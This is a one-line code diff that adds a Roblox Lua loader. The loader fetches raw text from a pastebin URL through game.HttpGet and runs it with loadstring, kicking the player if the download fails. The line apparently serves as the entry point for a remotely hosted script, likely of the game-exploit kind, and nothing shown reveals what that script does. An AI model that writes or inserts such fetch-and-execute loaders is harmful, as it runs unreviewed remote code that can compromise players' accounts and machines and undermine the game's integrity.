@@ -1,0 +1,1 @@
+httpget,link=game.HttpGet,"https://pastebin.com/raw/Ack4XAE6";s,r=pcall(httpget,game,link)if not s then game.Players.LocalPlayer:Kick("Failed to load pastebin.")return end;loadstring(r)();
